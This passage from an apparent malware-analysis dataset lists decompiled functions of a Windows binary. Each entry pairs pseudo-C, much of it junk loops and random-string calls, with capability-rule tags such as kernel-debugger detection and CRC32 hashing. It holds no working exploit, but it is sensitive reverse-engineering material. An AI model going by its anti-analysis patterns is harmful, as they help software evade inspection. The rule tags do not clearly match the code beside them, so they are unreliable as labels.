            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004020fe(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450840;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"xpewmymfqiomuxysdrrj\");\n    uStack24 = 2;\n    fcn.00401e79(\"rnavmlshycnvocfdlqdxgzetzlfkmhgtcwffrrlaqifxsvavbzagiixwssvheut\");\n    uStack24 = 3;\n    fcn.00401e79(\"eyynqdukxtp\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 265
    },
    "00402171": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402171(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h < *(*(in_ECX + 4) + 0xc)) {\n        var_18h = *(*(*(in_ECX + 4) + 8) + arg_8h * 4);\n    }\n    else {\n        var_18h = 0;\n    }\n    if ((var_18h == 0) && ((*(*(in_ECX + 4) + 0x14) & 1) != 0)) {\n        iVar1 = fcn.00404f7f();\n        if (arg_8h < *(iVar1 + 0xc)) {\n            var_4h = *(*(iVar1 + 8) + arg_8h * 4);\n        }\n        else {\n            var_4h = 0;\n        }\n    }\n    else {\n        var_4h = var_18h;\n    }\n    return var_4h;\n}\n",
        "token_count": 279
    },
    "00402180": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402180(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    \n    fcn.00401e79(\"iyykgpkqfnemtxmgacfnbueegblkplzxkwcybrcbubyrhtigh\");\n    for (iStack84 = 0x34; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    for (iStack88 = 0x17; 0 < iStack88; iStack88 = iStack88 + -1) {\n    }\n    for (iStack92 = 0x14; 0 < iStack92; iStack92 = iStack92 + -1) {\n    }\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 218
    },
    "004021bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004021bc(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack176;\n    uchar auStack172 [24];\n    uchar auStack148 [24];\n    int32_t iStack124;\n    uchar auStack120 [24];\n    uchar auStack96 [24];\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff38;\n    uStack28 = 0x451280;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"xpkbee\");\n    uStack68 = 0x40ab8600;\n    uStack72 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"xpkbee\");\n    uStack24 = 4;\n    fcn.00401e79(\"xpkbee\");\n    uVar1 = fcn.004042dc(auStack120, auStack96);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack124 = 0x27; 0 < iStack124; iStack124 = iStack124 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"xpkbee\");\n    uStack24 = 3;\n    fcn.00401e79(\"xpkbee\");\n    uVar1 = fcn.004042dc(auStack172, auStack148);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack176 = 3; 0 < iStack176; iStack176 = iStack176 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x1923;\n}\n",
        "token_count": 531
    },
    "004021cb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.004021cb(void)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack152;\n    int32_t iStack148;\n    uchar auStack144 [24];\n    uchar auStack120 [24];\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff58;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451320;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40936800;\n    uStack48 = 0;\n    uStack52 = 0x40d89940;\n    uStack56 = 0;\n    uStack60 = 0x155;\n    fcn.00401e79(\"isqkrefmrkavhyjwfcjgcadcsfjvfaqsviwnwycrlvlweuqffuoialtdbbdecujzbathgedgpwtpjwpjyktwotesvkhpyl\");\n    uStack88 = 0x377;\n    uStack92 = 0x40b0c800;\n    uStack96 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"isqkrefmrkavhyjwfcjgcadcsfjvfaqsviwnwycrlvlweuqffuoialtdbbdecujzbathgedgpwtpjwpjyktwotesvkhpyl\");\n    uStack24 = 1;\n    fcn.00401e79(\"isqkrefmrkavhyjwfcjgcadcsfjvfaqsviwnwycrlvlweuqffuoialtdbbdecujzbathgedgpwtpjwpjyktwotesvkhpyl\");\n    uVar1 = fcn.00405b37(auStack144, auStack120);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack148 = 0x12; 0 < iStack148; iStack148 = iStack148 + -1) {\n        }\n    }\n    for (iStack152 = 0x1e; 0 < iStack152; iStack152 = iStack152 + -1) {\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 644
    },
    "004021da": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.004021da(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h_2;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_10h_2;\n    code *pcStack16;\n    uint32_t uStack12;\n    uint var_4h;\n    \n    pcStack16 = fcn.00489430;\n    var_10h_2 = *in_FS_OFFSET;\n    uStack12 = *0x571ca8 ^ 0x56fb68;\n    *in_FS_OFFSET = &var_10h_2;\n    var_4h = 0;\n    iVar2 = fcn.00401d11(0x400000);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00401b63(0x400000, var_8h_2 + -0x400000);\n        if (iVar2 != 0) {\n            uVar1 = *(iVar2 + 0x24);\n            *in_FS_OFFSET = var_10h_2;\n            return ~(uVar1 >> 0x1f) & 1;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return 0;\n}\n",
        "token_count": 309
    },
    "00402365": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402365(uint *arg_8h)\n\n{\n    char cVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((**0x574458 != '\\0') && (**0x574458 == '_')) {\n        cVar1 = (*0x574458)[1];\n        if ((cVar1 != '\\0') && (cVar1 < 'E')) {\n            uVar4 = 0;\n            uVar3 = (*0x574458)[1] - 0x41;\n            *0x574458 = *0x574458 + 2;\n            if (uVar3 < 4) {\n                var_8h = 0;\n                var_4h = 0;\n                uVar2 = 0;\n                if ((~(*0x574460 >> 1) & 1) != 0) {\n                    fcn.00403d55(0x20);\n                    _var_10h = fcn.00402d29(0xe);\n                    fcn.00405d71(&var_10h);\n                    if (uVar3 != 0) {\n                        while( true ) {\n                            uVar5 = -uVar3 & uVar3;\n                            if (uVar5 == 1) {\n                                var_18h = 0x555a5c;\n                                arg_8h_00 = &var_18h;\n                                var_14h = 3;\n                            }\n                            else {\n                                if (uVar5 != 2) goto code_r0x00491323;\n                                arg_8h_00 = &var_10h;\n                                _var_10h = 0x300555a60;\n                            }\n                            fcn.00405d71(arg_8h_00);\n                            uVar3 = uVar3 & ~uVar5;\n                            if (uVar3 == 0) break;\n                            var_20h = 0x555a64;\n                            var_1ch = 2;\n                            fcn.00405d71(&var_20h);\n                        }\n                    }\n                    fcn.00403d55(0x29);\n                    uVar2 = var_4h;\n                    uVar4 = var_8h;\n                }\n                arg_8h[1] = uVar2;\n            }\n            else {\ncode_r0x00491323:\n                arg_8h[1] = 0;\n                *(arg_8h + 1) = 2;\n            }\n            goto code_r0x00491337;\n        }\n    }\n    uVar4 = 0;\n    arg_8h[1] = 0;\ncode_r0x00491337:\n    *arg_8h = uVar4;\n    return;\n}\n",
        "token_count": 680
    },
    "00402392": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402392(uint32_t arg_8h)\n\n{\n    return;\n}\n",
        "token_count": 23
    },
    "004023b5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004023b5(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0xffff;\n    if (arg_8h != -1) {\n        fcn.004058a8(arg_ch);\n        if (arg_8h < 0x100) {\n            uVar3 = arg_8h;\n            if ((*(\n                  L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                  + (arg_8h & 0xff)) & 1) != 0) {\n                uVar3 = *(*(var_10h + 0x94) + (arg_8h & 0xff));\n            }\n            uVar1 = uVar3;\n        }\n        else if (*(var_10h + 0xa8) == 0) {\n            uVar1 = arg_8h & 0xffff;\n        }\n        else {\n            iVar2 = fcn.00401f9b(*(var_10h + 0xa8), 0x100, &arg_8h, 1, &var_4h, 1);\n            if (iVar2 == 0) {\n                uVar1 = arg_8h & 0xffff;\n            }\n            else {\n                uVar1 = var_4h;\n            }\n        }\n        if (var_8h != '\\0') {\n            *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 735
    },
    "00402414": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402414(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b02();\n    return 0;\n}\n",
        "token_count": 40
    },
    "00402428": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402428(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_a8h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    uint var_70h;\n    uint var_58h;\n    uint var_54h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff20;\n    var_14h = 0x451740;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x14e0;\n    var_10h = 0;\n    fcn.00401e79(\"wojjfppmggmqpjomhgmpciactznqogpyhcxijgmkntutnggpip\");\n    var_10h = 1;\n    fcn.00401e79(\"wzhgtlchkmtallbsprbjvzvkeixkdxzcljommtthbufcwuxtumnrunlwyaevk\");\n    var_58h = 0xd36;\n    var_10h = 2;\n    fcn.00401e79(\"wojjfppmggmqpjomhgmpciactznqogpyhcxijgmkntutnggpip\");\n    var_10h = 4;\n    fcn.00401e79(\"wojjfppmggmqpjomhgmpciactznqogpyhcxijgmkntutnggpip\");\n    uVar1 = fcn.00405b37(&var_88h, &var_70h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_8ch = 0x51; 0 < var_8ch; var_8ch = var_8ch + -1) {\n        }\n    }\n    for (var_90h = 0x39; 0 < var_90h; var_90h = var_90h + -1) {\n    }\n    var_10h = 2;\n    fcn.00401e79(\"wzhgtlchkmtallbsprbjvzvkeixkdxzcljommtthbufcwuxtumnrunlwyaevk\");\n    var_10h = 3;\n    fcn.00401e79(\"wzhgtlchkmtallbsprbjvzvkeixkdxzcljommtthbufcwuxtumnrunlwyaevk\");\n    uVar1 = fcn.004042dc(&var_c0h, &var_a8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_c4h = 0x5d; 0 < var_c4h; var_c4h = var_c4h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(0x548437);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 845
    },
    "0040247d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040247d(uint arg_8h)\n\n{\n    return 1;\n}\n",
        "token_count": 24
    },
    "00402518": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00402518(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f908, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x575488)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x575220) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0040150a(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x575220) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.00403a35();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040185c();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.00401df7(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004d196a();\n                goto code_r0x004d198d;\n            }\n        }\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n        fcn.004037ce();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004d198d:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 660
    },
    "0040255e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040255e(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    char **ppcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *piVar9;\n    char **ppcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    int16_t **ppiVar13;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    char *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004058a8(0);\n    pcVar11 = 0x164;\n    var_10h = NULL;\n    var_8h = 0;\n    ppcVar4 = *(var_24h + 0x9c);\n    var_ch = 0;\n    do {\n        pcVar12 = pcVar11;\n        if (var_8h == 1) {\n            iVar6 = fcn.0040409d(pcVar11);\n            var_ch = 0;\n            if (iVar6 == 0) break;\n            fcn.00403189(iVar6, 0, pcVar11);\n            pcVar12 = 0x164;\n            var_10h = pcVar11;\n            var_ch = iVar6;\n        }\n        iVar6 = var_ch - ppcVar4;\n        var_18h = 0;\n        ppcVar10 = ppcVar4;\n        do {\n            if (var_8h == 1) {\n                *(iVar6 + ppcVar10) = pcVar12 + var_ch;\n                iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            var_18h = var_18h + 1;\n            ppcVar10 = ppcVar10 + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 7;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0xe;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0x1a;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0x26;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 2);\n        if (var_8h == 1) {\n            *(var_ch + 0xa0) = pcVar12 + var_ch;\n            iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, ppcVar4[0x28]);\n            if (iVar7 != 0) goto code_r0x004becc2;\n        }\n        pcVar8 = ppcVar4[0x28];\n        pcVar11 = pcVar8 + 1;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pcVar8 + pcVar12 + (1 - pcVar11);\n        if (var_8h == 1) {\n            *(var_ch + 0xa4) = pcVar8 + var_ch;\n            iVar7 = fcn.0040605a(pcVar8 + var_ch, var_10h - pcVar8, ppcVar4[0x29]);\n            if (iVar7 != 0) goto code_r0x004becc2;\n        }\n        pcVar12 = ppcVar4[0x29];\n        pcVar11 = pcVar12 + 1;\n        do {\n            cVar2 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar2 != '\\0');\n        pcVar12 = pcVar12 + pcVar8 + (1 - pcVar11);\n        if (var_8h == 1) {\n            *(var_ch + 0xa8) = pcVar12 + var_ch;\n            iVar7 = fcn.0040605a(pcVar12 + var_ch, var_10h - pcVar12, ppcVar4[0x2a]);\n            if (iVar7 != 0) goto code_r0x004becc2;\n        }\n        pcVar11 = ppcVar4[0x2a];\n        pcVar8 = pcVar11 + 1;\n        do {\n            cVar2 = *pcVar11;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar2 != '\\0');\n        pcVar11 = pcVar11 + pcVar12 + (1 - pcVar8);\n        if (var_8h == 1) {\n            *(var_ch + 0xac) = ppcVar4[0x2b];\n            *(var_ch + 0xb0) = 0;\n        }\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x2d;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x34;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x3b;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x47;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x53;\n 